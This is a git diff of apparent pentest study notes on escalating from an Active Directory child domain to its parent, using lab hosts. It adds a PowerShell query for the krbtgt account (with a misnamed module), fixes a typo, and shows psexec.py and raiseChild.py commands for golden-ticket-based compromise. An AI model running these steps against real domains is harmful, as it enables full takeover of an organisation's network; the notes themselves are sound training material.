@@ -70,6 +70,11 @@ May be able to then peform DCSync or create a [golden ticket](https://attack.mit
 - The FQDN of the child domain.
 - The SID of the Enterprise Admins group of the root domain.
 - With this data collected, the attack can be performed with Mimikatz.
+```powershell
+import-module active-directory
+get-aduser krbtgt
+```
+
 Allows compromise of a parent domain.
 ###### Obtaining the KRBTGT Account hash
 First, we need to otain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory
@@ -159,7 +164,7 @@ export KRB5CCNAME=hacker.ccache
 ```shell
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 ```
-### Can also use raiseChild to automate escalating from child to paarent domain. 
+### Can also use raiseChild to automate escalating from child to parent domain. 
 ```shell
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
